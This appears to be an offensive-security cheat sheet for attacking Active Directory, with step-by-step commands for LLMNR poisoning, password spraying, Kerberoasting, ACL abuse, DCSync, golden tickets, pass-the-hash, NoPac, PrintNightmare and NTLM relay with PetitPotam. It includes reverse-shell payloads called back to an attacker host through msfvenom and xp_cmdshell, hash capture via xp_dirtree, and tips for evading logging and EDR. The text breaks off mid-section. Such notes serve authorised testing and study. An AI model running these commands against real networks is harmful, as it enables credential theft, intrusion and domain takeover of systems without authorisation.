# PHASE 9: ACTIVE DIRECTORY ATTACKS

> Follow sequentially. After each new foothold, restart from Phase 1 on new host.
> All attacks shown from BOTH Linux and Windows where applicable.

---

## 9.1 - INITIAL ACCESS (No Credentials)

### 9.1.1 - LLMNR/NBT-NS Poisoning

**Decision: Is LLMNR/NBT-NS active on network?**
```
├── Yes → Run Responder to capture NetNTLMv2 hashes
│   ├── Crack with hashcat -m 5600
│   └── Use cracked creds for credentialed enumeration
├── SMB Relay possible? → ntlmrelayx.py (no SMB signing)
└── No → Move to password spraying
```

**Linux - Responder:**
```bash
# Passive analysis first
sudo responder -I <interface> -A

# Active poisoning (start in tmux, let run)
sudo responder -I <interface> -wrf
# -w = WPAD, -r = Wredir, -f = Fingerprint

# Logs location
ls /usr/share/responder/logs/
# Format: SMB-NTLMv2-SSP-<IP>.txt

# Crack captured hash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Windows - Inveigh:**
```powershell
# PowerShell version
Import-Module .\Inveigh.ps1
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y

# C# version (preferred, maintained)
.\Inveigh.exe
# Press ESC for interactive console
# GET NTLMV2UNIQUE - view captured hashes
# GET NTLMV2USERNAMES - see which users captured
```

### 9.1.2 - SMB NULL Session & LDAP Anonymous Bind

**Check SMB NULL Session:**
```bash
# rpcclient
rpcclient -U '' -N <dc_ip>
rpcclient $> querydominfo
rpcclient $> enumdomusers
rpcclient $> getdompwinfo

# enum4linux
enum4linux -U <dc_ip> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
enum4linux -P <dc_ip>

# enum4linux-ng
enum4linux-ng -P <dc_ip> -oA output

# CrackMapExec (no creds)
netexec smb <dc_ip> --shares
netexec smb <dc_ip> --users
netexec smb <dc_ip> --pass-pol
netexec smb <dc_ip> -u '' -p '' --rid-brute
```

**Check LDAP Anonymous Bind:**
```bash
# ldapsearch
ldapsearch -h <dc_ip> -x -b "DC=domain,DC=local" -s sub "(&(objectclass=user))" | grep sAMAccountName
ldapsearch -h <dc_ip> -x -b "DC=domain,DC=local" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# windapsearch
./windapsearch.py --dc-ip <dc_ip> -u "" -U
```

### 9.1.3 - Username Enumeration

**Kerbrute (stealthy - no 4625 events):**
```bash
# User enumeration (doesn't lock accounts)
kerbrute userenum -d <domain> --dc <dc_ip> /usr/share/seclists/Usernames/jsmith.txt

# Combine with LinkedIn scraping
python3 linkedin2username.py -c "Company Name" -d domain.com

# Statistically-likely-usernames from GitHub
# jsmith.txt, jsmith2.txt, etc.
```

### 9.1.4 - Password Policy Enumeration

**Without creds:**
```bash
# rpcclient NULL session
rpcclient -U '' -N <dc_ip>
rpcclient $> getdompwinfo

# enum4linux
enum4linux -P <dc_ip>

# LDAP anonymous
ldapsearch -h <dc_ip> -x -b "DC=domain,DC=local" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

**With creds:**
```bash
# CrackMapExec
netexec smb <dc_ip> -u <user> -p '<pass>' --pass-pol

# Windows
net accounts
# or
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
```

**Key policy fields:**
```
- Lockout threshold (e.g., 5 attempts)
- Lockout duration (e.g., 30 min)
- Min password length (e.g., 8)
- Password complexity (enabled/disabled)
```

### 9.1.5 - Password Spraying

**Decision: Know lockout policy?**
```
├── Yes → Spray (threshold - 1) passwords, wait lockout_duration between sprays
├── Unknown → 1-2 targeted sprays, wait 1+ hour between
└── No lockout → Full brute force
```

**Target user list sources:**
```
1. SMB NULL session → enumdomusers / enum4linux -U / netexec --users
2. LDAP anonymous → ldapsearch / windapsearch
3. Kerbrute userenum with jsmith.txt
4. LinkedIn scraping → linkedin2username
5. Credentialed → netexec --users (shows badpwdcount)
```

**Filter out near-lockout accounts:**
```bash
# CrackMapExec shows badpwdcount - filter accounts with count > 0
netexec smb <dc_ip> -u <user> -p '<pass>' --users | grep "badpwdcount: 0"
```

**Spray from Linux:**
```bash
# rpcclient one-liner
for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" <dc_ip> | grep Authority; done

# Kerbrute (faster, generates 4768 not 4625)
kerbrute passwordspray -d <domain> --dc <dc_ip> valid_users.txt 'Welcome1'

# CrackMapExec
netexec smb <dc_ip> -u valid_users.txt -p 'Password123' | grep +

# Common passwords to try
# Welcome1, Password1, Password123, Company1!, Summer2024!, Winter2024!
# Season+Year patterns: Spring2024!, Fall2024!
```

**Spray from Windows:**
```powershell
# DomainPasswordSpray.ps1 (auto-excludes near-lockout)
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

# Kerbrute from Windows
.\kerbrute.exe passwordspray -d <domain> --dc <dc_ip> valid_users.txt 'Welcome1'
```

### 9.1.6 - mitm6 (IPv6 DHCPv6/WPAD Takeover)

> Windows prefers IPv6. Most networks have no DHCPv6 server. mitm6 fills the gap — becomes
> DNS for the network, poisons WPAD → captures NTLM auth → relay to LDAPS / ADCS / SMB.

```bash
# Terminal 1: mitm6 (only target the domain we care about)
sudo mitm6 -d <domain> -i <interface>

# Terminal 2: ntlmrelayx with IPv6 + LDAPS target
# Goal: delegate access (RBCD) on any computer that auths
sudo ntlmrelayx.py -6 -t ldaps://<dc_ip> -wh fakewpad.<domain> --delegate-access --no-smb-server

# Alt targets:
# Relay to ADCS HTTP enrollment (ESC8):
sudo ntlmrelayx.py -6 -t http://<adcs_host>/certsrv/certfnsh.asp -wh fakewpad.<domain> --adcs --template DomainController

# Relay to SMB on file server (if signing not required):
sudo ntlmrelayx.py -6 -tf smb_targets.txt -wh fakewpad.<domain> -smb2support --no-http-server

# When user logs in / reboots / opens browser → WPAD lookup → 4xx → NTLM auth → relayed
# Successful relay: ntlmrelayx prints "[*] Authenticating against ldaps://... SUCCEED"
# RBCD set on target computer → use FAKE$ + getST.py to impersonate admin (see §9.8.6)
```

### 9.1.7 - AS-REP Roasting (No Creds Needed)

```bash
# Find users with DONT_REQ_PREAUTH
GetNPUsers.py <domain>/ -usersfile usernames.txt -format hashcat -outputfile asrep.hash -dc-ip <dc_ip>

# Crack
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

---

## 9.2 - CREDENTIALED ENUMERATION (Linux)

**Prerequisite: valid domain creds (cleartext, NTLM hash, or SYSTEM on domain-joined host)**

### 9.2.1 - CrackMapExec / NetExec

```bash
# Users (with badpwdcount for targeted spraying)
netexec smb <dc_ip> -u <user> -p '<pass>' --users

# Groups
netexec smb <dc_ip> -u <user> -p '<pass>' --groups

# Shares (check READ/WRITE access)
netexec smb <dc_ip> -u <user> -p '<pass>' --shares

# Logged-on users (find DA sessions!)
netexec smb <target> -u <user> -p '<pass>' --loggedon-users

# Password policy
netexec smb <dc_ip> -u <user> -p '<pass>' --pass-pol

# RID brute (find all users even without --users)
netexec smb <dc_ip> -u <user> -p '<pass>' --rid-brute

# Spider shares for files
netexec smb <dc_ip> -u <user> -p '<pass>' -M spider_plus --share 'Department Shares'

# Pass-the-Hash
netexec smb <target> -u <user> -H <nt_hash>

# Local admin spray across subnet
netexec smb 172.16.5.0/23 --local-auth -u administrator -H <hash> | grep +
```

### 9.2.2 - SMBMap

```bash
# Check access
smbmap -u <user> -p '<pass>' -d <domain> -H <dc_ip>

# Recursive listing
smbmap -u <user> -p '<pass>' -d <domain> -H <dc_ip> -R 'Department Shares' --dir-only

# Search file contents
smbmap -u <user> -p '<pass>' -d <domain> -H <dc_ip> -R 'Department Shares' -A <pattern>
```

### 9.2.3 - rpcclient (Authenticated)

```bash
rpcclient -U '<user>%<pass>' <dc_ip>
rpcclient $> enumdomusers
rpcclient $> queryuser 0x457        # By RID
rpcclient $> querygroup 0x200       # Domain Users
rpcclient $> querygroupmem 0x200    # Group members
```

### 9.2.4 - BloodHound.py (Linux Collector)

```bash
# Run collection (all methods)
sudo bloodhound-python -u '<user>' -p '<pass>' -ns <dc_ip> -d <domain> -c All

# Specific collection
bloodhound-python -u '<user>' -p '<pass>' -ns <dc_ip> -d <domain> -c DCOnly  # No computer connections
bloodhound-python -u '<user>' -p '<pass>' -ns <dc_ip> -d <domain> -c Group,LocalAdmin,Session,ACL

# Output: timestamp_computers.json, timestamp_groups.json, timestamp_users.json, timestamp_domains.json
# Zip for upload
zip -r bh_data.zip *.json

# Start neo4j and BloodHound GUI
sudo neo4j start
bloodhound
# Default creds: neo4j / <set password>
# Upload zip → Analysis tab → Run queries
```

**Key BloodHound queries for exam:**
```
- Find Shortest Paths to Domain Admins
- Find Computers where Domain Users are Local Admin
- Find Workstations where Domain Users can RDP
- Find Servers where Domain Users can RDP
- Find Computers with Unsupported Operating Systems
- Find All Domain Trusts
```

### 9.2.5 - Windapsearch

```bash
# Domain Admins
python3 windapsearch.py --dc-ip <dc_ip> -u <user>@<domain> -p '<pass>' --da

# Privileged users (recursive nested group membership)
python3 windapsearch.py --dc-ip <dc_ip> -u <user>@<domain> -p '<pass>' -PU

# All users
python3 windapsearch.py --dc-ip <dc_ip> -u <user>@<domain> -p '<pass>' -U
```

### 9.2.6 - Impacket Toolkit

```bash
# psexec.py (needs local admin, drops exe to ADMIN$, gives SYSTEM)
psexec.py <domain>/<user>:'<pass>'@<target>

# wmiexec.py (stealthier, runs as user not SYSTEM, fewer logs)
wmiexec.py <domain>/<user>:'<pass>'@<target>

# smbexec.py (creates temp bat files, noisy)
smbexec.py <domain>/<user>:'<pass>'@<target>

# atexec.py (task scheduler)
atexec.py <domain>/<user>:'<pass>'@<target> <command>

# Pass-the-Hash with any of these
psexec.py -hashes :<nt_hash> <domain>/<user>@<target>
```

---

## 9.3 - CREDENTIALED ENUMERATION (Windows)

### 9.3.1 - ActiveDirectory PowerShell Module

```powershell
Import-Module ActiveDirectory

# Domain info
Get-ADDomain
Get-ADDomain -Identity <child_domain>

# Trust relationships
Get-ADTrust -Filter *

# Users with SPNs (Kerberoast targets)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# All groups
Get-ADGroup -Filter * | select name

# Group members
Get-ADGroupMember -Identity "Domain Admins"

# Users with PASSWD_NOTREQD
Get-ADUser -Filter 'userAccountControl -band 32' -Properties userAccountControl

# Users with reversible encryption
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

### 9.3.2 - PowerView

```powershell
Import-Module .\PowerView.ps1

# Domain users
Get-DomainUser -Identity <user> | select *
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName  # SPN accounts
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*DONT_REQ_PREAUTH*'}  # AS-REP

# Domain groups (recursive membership)
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Domain computers
Get-DomainComputer | select dnshostname,operatingsystem

# GPOs
Get-DomainGPO | select displayname

# ACLs (find interesting rights)
Find-InterestingDomainAcl -ResolveGUIDs

# Targeted ACL search
$sid = Convert-NameToSid <user>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Test local admin access
Test-AdminAccess -ComputerName <target>

# Find where user has local admin
Find-LocalAdminAccess

# Find user sessions
Find-DomainUserLocation

# Shares
Find-DomainShare -CheckShareAccess
Find-InterestingDomainShareFile

# Trust mapping
Get-DomainTrustMapping
Get-DomainTrust -Domain <domain>

# Policy
Get-DomainPolicy
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess  # Password policy
```

### 9.3.3 - BloodHound/SharpHound (Windows Collector)

```powershell
# Run SharpHound
.\SharpHound.exe -c All --zipfilename <domain>

# Specific methods
.\SharpHound.exe -c DCOnly          # No computer connections (stealthier)
.\SharpHound.exe -c ACL,Group,Trusts
.\SharpHound.exe --stealth           # Stealth collection

# Upload zip to BloodHound GUI
bloodhound  # Start GUI (creds: neo4j / <password>)
```

### 9.3.3b - LAPS + gMSA Password Extraction

> Both store passwords in LDAP attributes readable by privileged users.
> Common one-click wins if BloodHound shows we have read rights.

**LAPS (ms-Mcs-AdmPwd / msLAPS-Password):**
```bash
# Find who can read LAPS
netexec ldap <dc_ip> -u <user> -p '<pass>' -M laps
# Output: rows = computer + cleartext local admin pass (if we have rights)

# Manual LDAP query
ldapsearch -h <dc_ip> -x -D '<user>@<domain>' -w '<pass>' -b 'DC=...' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd cn
# New LAPS (Windows LAPS 2023+):
ldapsearch -h <dc_ip> -x -D '<user>@<domain>' -w '<pass>' -b 'DC=...' '(msLAPS-Password=*)' msLAPS-Password cn

# Windows
Get-LAPSComputers
Get-DomainObject -Identity <computer> -Properties ms-Mcs-AdmPwd
# New LAPS:
Get-LapsADPassword -Identity <computer> -AsPlainText
```

**gMSA (msDS-ManagedPassword via gMSADumper):**
```bash
# Requires PrincipalsAllowedToRetrieveManagedPassword membership
# BloodHound: ReadGMSAPassword edge → we can extract

python3 gMSADumper.py -u <user> -p '<pass>' -d <domain> -l <dc_ip>
# Output: gMSA account NT hash → Pass-the-Hash to run as service account

# Use the hash
netexec smb <target> -u 'GMSA_ACCOUNT$' -H <nt_hash>
psexec.py -hashes :<nt_hash> '<domain>/GMSA_ACCOUNT$@<target>'
```

### 9.3.4 - Security Controls Enumeration

```powershell
# Windows Defender status
Get-MpComputerStatus
sc query windefend

# AppLocker policy
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# PowerShell Language Mode
$ExecutionContext.SessionState.LanguageMode

# LAPS enumeration
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers

# Firewall status
netsh advfirewall show allprofiles

# Check logged-on users (are you alone?)
qwinsta
```

### 9.3.5 - Living Off the Land

```powershell
# Host recon
hostname
systeminfo
[System.Environment]::OSVersion.Version
ipconfig /all
arp -a
route print
netsh advfirewall show allprofiles
sc query windefend

# Domain recon (built-in)
net user /domain
net group /domain
net group "Domain Admins" /domain
net group "Domain Controllers" /domain
net accounts /domain
net localgroup administrators /domain

# net1 trick (avoids some EDR detection)
net1 user /domain
net1 group "Domain Admins" /domain

# WMI
wmic ntdomain list /format:list
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
wmic useraccount list /format:list
wmic group list /format:list

# dsquery
dsquery user
dsquery computer
dsquery * "CN=Users,DC=domain,DC=local"
# Find DCs
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
# Find users with PASSWD_NOTREQD
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# PowerShell history (may contain creds!)
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

# Downgrade PowerShell (bypass Script Block Logging)
powershell.exe -version 2
Get-Host  # Verify version
```

---

## 9.4 - KERBEROASTING

**Prerequisite: domain user creds (any level) or SYSTEM on domain-joined host**

### 9.4.1 - From Linux (GetUserSPNs.py)

```bash
# List SPN accounts with group membership
GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user>

# Request all TGS tickets
GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user> -request

# Target specific user, save to file
GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user> -request-user <spn_user> -outputfile tgs_hash

# Crack (etype 23 = RC4)
hashcat -m 13100 tgs_hash /usr/share/wordlists/rockyou.txt

# If AES (etype 18) - much slower
hashcat -m 19700 tgs_hash /usr/share/wordlists/rockyou.txt
```

### 9.4.2 - From Windows (Rubeus)

```powershell
# Stats (see encryption types, password ages)
.\Rubeus.exe kerberoast /stats

# Target admin-count=1 accounts (high value)
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# All SPN accounts
.\Rubeus.exe kerberoast /nowrap

# Specific user
.\Rubeus.exe kerberoast /user:<spn_user> /nowrap

# Force RC4 downgrade (bypass AES - works pre-Server 2019)
.\Rubeus.exe kerberoast /usetgtdeleg /nowrap

# AES Kerberoasting
.\Rubeus.exe kerberoast /aes /nowrap

# Output to file
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

### 9.4.3 - From Windows (PowerView + Mimikatz)

```powershell
# Enumerate SPN accounts
Get-DomainUser * -spn | select samaccountname

# Get TGS in Hashcat format
Get-DomainUser -Identity <spn_user> | Get-DomainSPNTicket -Format Hashcat

# Export all
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation

# Semi-manual: Request ticket with PowerShell, extract with Mimikatz
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/host:1433"

# Mimikatz extract
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
# Convert base64 → kirbi → john format → hashcat
```

### 9.4.4 - Encryption Types

```
RC4 (type 23) = $krb5tgs$23$* → hashcat -m 13100 → FAST
AES-256 (type 18) = $krb5tgs$18$* → hashcat -m 19700 → SLOW (100x+)

Key insight: Pre-Server 2019 DCs → use /tgtdeleg to force RC4 even on AES accounts
Server 2019+ → always returns highest supported encryption

Mitigation: Set msDS-SupportedEncryptionTypes to 24 (AES only) on SPN accounts
```

### 9.4.5 - After Cracking

```bash
# Validate creds
netexec smb <dc_ip> -u <spn_user> -p '<cracked_pass>'

# Spray cracked password across domain (password reuse!)
netexec smb <dc_range> -u <user_list> -p '<cracked_pass>'

# If SPN is MSSQLSvc → connect with mssqlclient.py
mssqlclient.py <domain>/<user>:'<pass>'@<target> -windows-auth
# Enable xp_cmdshell for RCE
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

---

## 9.5 - ACL ABUSE

### 9.5.1 - Key ACE Types

```
GenericAll      → Full control (reset password, add member, Kerberoast)
GenericWrite    → Write non-protected attrs (set SPN for targeted Kerberoast, add to group)
WriteDACL       → Modify ACL (grant self DCSync rights)
WriteOwner      → Change object owner → then WriteDACL
ForceChangePassword → Reset user password without knowing current
AddSelf         → Add self to group
AllExtendedRights → Reset password, add to group
```

### 9.5.2 - ACL Enumeration

**PowerView (targeted - start from controlled user):**
```powershell
# Get SID of controlled user
$sid = Convert-NameToSid <controlled_user>

# Find objects controlled by this user
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Key output fields:
# - ObjectDN: target object
# - ObjectAceType: the right (e.g., User-Force-Change-Password)
# - ActiveDirectoryRights: the permission level
```

**BloodHound (visual - fastest):**
```
1. Upload SharpHound data
2. Set controlled user as starting node
3. Check "Outbound Control Rights" in Node Info
4. Check "Transitive Object Control" for full chain
5. Use "Find Shortest Paths to Domain Admins" query
6. Right-click edges → Help for abuse instructions
```

**Top Cypher queries (paste in BloodHound Cypher tab):**
```
// 1. Shortest path from owned users to Domain Admins
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group)) WHERE g.name STARTS WITH 'DOMAIN ADMINS@' RETURN p

// 2. All kerberoastable users (have SPN + enabled)
MATCH (u:User) WHERE u.hasspn=true AND u.enabled=true RETURN u.name, u.serviceprincipalnames

// 3. AS-REP roastable users (DONT_REQ_PREAUTH)
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

// 4. Where owned users can RDP / PSRemote
MATCH p=(u:User {owned:true})-[:CanRDP|CanPSRemote*1..]->(c:Computer) RETURN p

// 5. Outbound ACL edges from any owned user (every object they can modify)
MATCH p=(u:User {owned:true})-[:GenericAll|GenericWrite|WriteOwner|WriteDacl|ForceChangePassword|AllExtendedRights*1..]->(t) RETURN p

// 6. Computers with unconstrained delegation (DA harvest targets)
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

// 7. Computers with constrained delegation set
MATCH (c) WHERE c.allowedtodelegate IS NOT NULL RETURN c.name, c.allowedtodelegate

// 8. Find DA sessions on non-DC machines (lateral move targets)
MATCH (u:User)-[:MemberOf*1..]->(g:Group) WHERE g.name STARTS WITH 'DOMAIN ADMINS@' WITH u MATCH (c:Computer)-[:HasSession]->(u) WHERE NOT c.name CONTAINS 'DC' RETURN c.name, u.name

// 9. gMSAs we can read
MATCH p=(u:User {owned:true})-[:ReadGMSAPassword]->(g) RETURN p

// 10. LAPS read rights from owned position
MATCH p=(u:User {owned:true})-[:ReadLAPSPassword]->(c:Computer) RETURN p
```

**Mark a node as owned (so the above queries work):**
```
// In Cypher tab
MATCH (u:User) WHERE u.name = 'USER@DOMAIN.LOCAL' SET u.owned = true RETURN u
```

### 9.5.3 - ACL Attack Chain Example

```
User A (controlled) → ForceChangePassword → User B
User B → GenericWrite → Group C (add self)
Group C → nested in → Group D
Group D → GenericAll → User E
User E → has DCSync rights → Full domain compromise

Execution:
1. Set-DomainUserPassword -Identity UserB -AccountPassword 'NewPass!' -Credential $CredA
2. Add-DomainGroupMember -Identity "GroupC" -Members UserB -Credential $CredB
3. (Inherits Group D rights automatically via nesting)
4. Set-DomainUserPassword -Identity UserE -AccountPassword 'NewPass2!' (or targeted Kerberoast)
5. secretsdump.py domain/UserE:'NewPass2!'@dc_ip → DCSync → all hashes
```

### 9.5.4 - ACL Abuse Commands

**ForceChangePassword:**
```powershell
$SecPassword = ConvertTo-SecureString '<our_pass>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\<our_user>', $SecPassword)
$newpass = ConvertTo-SecureString 'Pwn3d!' -AsPlainText -Force
Set-DomainUserPassword -Identity <target> -AccountPassword $newpass -Credential $Cred -Verbose
```

**AddMember (GenericWrite over group):**
```powershell
Add-DomainGroupMember -Identity "<target_group>" -Members "<our_user>" -Credential $Cred -Verbose
# Verify
Get-DomainGroupMember -Identity "<target_group>" -Recurse
```

**Targeted Kerberoast (GenericWrite over user - set SPN):**
```powershell
Set-DomainObject -Credential $Cred -Identity <target_user> -SET @{serviceprincipalname='fake/SPN'}
# Now Kerberoast the user
GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user> -request-user <target_user>
# Clean up
Set-DomainObject -Credential $Cred -Identity <target_user> -Clear serviceprincipalname
```

**Linux equivalents:**
```bash
# ForceChangePassword
pth-net rpc password <target> '<new_pass>' -U '<domain>/<our_user>%<our_pass>' -S <dc_ip>

# AddMember
pth-net rpc group addmem "<target_group>" "<our_user>" -U '<domain>/<our_user>%<our_pass>' -S <dc_ip>
```

---

## 9.6 - DCSync

**Prerequisite: account with Replicating Directory Changes + Replicating Directory Changes All permissions**
(Default: Domain Admins, Enterprise Admins, or delegated accounts)

### 9.6.1 - Enumerate DCSync Rights

```powershell
# Check specific user's replication rights
$sid = Convert-NameToSid <target_user>
Get-ObjectAcl "DC=domain,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights, ObjectAceType | fl
```

### 9.6.2 - Execute DCSync

**Linux (secretsdump.py):**
```bash
# All hashes + Kerberos keys + cleartext
secretsdump.py -outputfile domain_hashes -just-dc <domain>/<user>:'<pass>'@<dc_ip>

# NTLM only
secretsdump.py -outputfile domain_hashes -just-dc-ntlm <domain>/<user>:'<pass>'@<dc_ip>

# Single user
secretsdump.py <domain>/<user>:'<pass>'@<dc_ip> -just-dc-user <target_user>

# With hash
secretsdump.py -hashes :<nt_hash> <domain>/<user>@<dc_ip>

# Useful flags: -pwd-last-set, -history, -user-status
```

**Windows (Mimikatz):**
```powershell
# Must run as DCSync-capable user
runas /netonly /user:DOMAIN\<dcsync_user> powershell
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:<domain> /user:DOMAIN\<target>
```

### 9.6.3 - After DCSync

```bash
# Use krbtgt hash for Golden Ticket (persistence)
mimikatz # kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt

# Use admin hash for Pass-the-Hash
netexec smb <dc_ip> -u administrator -H <admin_nt_hash>
psexec.py -hashes :<admin_nt_hash> <domain>/administrator@<dc_ip>

# Crack hashes offline
hashcat -m 1000 hashes.ntds /usr/share/wordlists/rockyou.txt
```

---

## 9.7 - PRIVILEGED ACCESS & LATERAL MOVEMENT

### 9.7.1 - RDP Access

```powershell
# Enumerate RDP users (PowerView)
Get-NetLocalGroupMember -ComputerName <target> -GroupName "Remote Desktop Users"

# BloodHound: CanRDP edge, "Find Workstations where Domain Users can RDP"

# Connect from Linux
xfreerdp /v:<target> /u:<user> /p:'<pass>'
xfreerdp /v:<target> /u:<user> /pth:<nt_hash>  # PtH

# Connect from Windows
mstsc.exe /v:<target>
```

### 9.7.2 - WinRM Access

```powershell
# Enumerate WinRM users (PowerView)
Get-NetLocalGroupMember -ComputerName <target> -GroupName "Remote Management Users"

# BloodHound: CanPSRemote edge
# Custom Cypher: MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

# From Windows
$password = ConvertTo-SecureString "<pass>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("DOMAIN\<user>", $password)
Enter-PSSession -ComputerName <target> -Credential $cred

# From Linux (evil-winrm)
evil-winrm -i <target> -u <user> -p '<pass>'
evil-winrm -i <target> -u <user> -H <nt_hash>
```

### 9.7.3 - MSSQL Admin Access

```bash
# BloodHound: SQLAdmin edge

# From Linux
mssqlclient.py <domain>/<user>:'<pass>'@<target> -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> xp_cmdshell powershell -e <base64_revshell>

# Hash capture via xp_dirtree
SQL> xp_dirtree '\\<attacker_ip>\share'

# From Windows (PowerUpSQL)
Get-SQLInstanceDomain
Get-SQLServerLinkCrawl -Instance <target>
Invoke-SQLOSCmd -Instance <target> -Command "whoami"
```

### 9.7.4 - Pass-the-Hash

```bash
# CrackMapExec (scan range)
netexec smb <range> --local-auth -u <user> -H <nt_hash> | grep +

# Impacket
psexec.py -hashes :<nt_hash> <domain>/<user>@<target>
wmiexec.py -hashes :<nt_hash> <domain>/<user>@<target>
evil-winrm -i <target> -u <user> -H <nt_hash>
xfreerdp /v:<target> /u:<user> /pth:<nt_hash>
```

### 9.7.5 - Kerberos Double Hop Problem

**Problem:** WinRM to Host A → Host A tries to access DC → fails (TGT not cached)

**Solutions:**
```powershell
# Solution 1: PSCredential with every command
$SecPassword = ConvertTo-SecureString 'pass' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $SecPassword)
Invoke-Command -ComputerName HOST -Credential $Cred -ScriptBlock { whoami }

# Solution 2: Register-PSSessionConfiguration
Register-PSSessionConfiguration -Name sess -RunAsCredential DOMAIN\user
Enter-PSSession -ComputerName HOST -Credential $cred -ConfigurationName sess

# Solution 3: Use RDP instead (password cached in memory)
xfreerdp /v:HOST /u:user /p:pass
```

---

## 9.8 - BLEEDING EDGE / ADVANCED ATTACKS

### 9.8.1 - NoPac (SamAccountName Spoofing)

CVE-2021-42278 + CVE-2021-42287. Any domain user → Domain Admin.

```bash
# Scan for vulnerability
sudo python3 scanner.py <domain>/<user>:<pass> -dc-ip <dc_ip> -use-ldap

# Exploit (SYSTEM shell on DC)
sudo python3 noPac.py <domain>/<user>:<pass> -dc-ip <dc_ip> -dc-host <dc_hostname> -shell --impersonate administrator -use-ldap

# DCSync via noPac
sudo python3 noPac.py <domain>/<user>:<pass> -dc-ip <dc_ip> -dc-host <dc_hostname> --impersonate administrator -use-ldap -dump -just-dc-user <domain>/administrator

# Requires: ms-DS-MachineAccountQuota > 0 (default: 10)
# Mitigation: Set ms-DS-MachineAccountQuota to 0
```

### 9.8.2 - PrintNightmare

CVE-2021-34527 / CVE-2021-1675. RCE via Print Spooler service.

```bash
# Check if Print Spooler exposed
rpcdump.py @<dc_ip> | egrep 'MS-RPRN|MS-PAR'

# Exploit (needs cube0x0's Impacket fork)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker> LPORT=8080 -f dll > shell.dll
sudo smbserver.py -smb2support Share /path/to/shell.dll
python3 CVE-2021-1675.py <domain>/<user>:<pass>@<target> '\\<attacker>\Share\shell.dll'

# Mitigation: Disable Print Spooler service
# Check: Get-Service Spooler
```

### 9.8.3 - PetitPotam + NTLM Relay to ADCS

Coerce DC authentication → relay to ADCS → get certificate → authenticate as DC.

```bash
# Check if MS-EFSRPC exposed
rpcdump.py @<target> | grep MS-EFSR

# PetitPotam - coerce auth to attacker
python3 PetitPotam.py <attacker_ip> <dc_ip>

# ntlmrelayx to ADCS web enrollment
ntlmrelayx.py -t http://<adcs_host>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Use captured certificate for PKINIT auth
python3 gettgtpkinit.py -cert-pfx <pfx_file> -pfx-pass '' <domain>/<dc_machine_account>$ <dc_machine_account>.ccache

# Extract NT hash from TGT
export KRB5CCNAME=<dc_machine_account>.ccache
python3 getnthash.py <domain>/<dc_machine_account>$ -key <asrep_key>

# DCSync with DC machine account hash
secretsdump.py -just-dc-ntlm -hashes :<nt_hash> <domain>/<dc_machine_account>$@<dc_ip>
```

### 9.8.3b - Coerced Auth Methods (full menu)

> PetitPotam shown in §9.8.3. Other coercion methods below — try in order until one fires.
> All have the same shape: force <victim> to authenticate to <attacker>, which relays the NTLM.

```bash
# 1. PetitPotam (MS-EFSRPC) — patched on newest Windows but often still works
python3 PetitPotam.py <attacker_ip> <victim_ip>
python3 PetitPotam.py -u <user> -p '<pass>' -d <domain> <attacker_ip> <victim_ip>   # authenticated variant

# 2. PrinterBug (MS-RPRN) — needs Print Spooler running on victim
python3 printerbug.py <domain>/<user>:'<pass>'@<victim_ip> <attacker_ip>
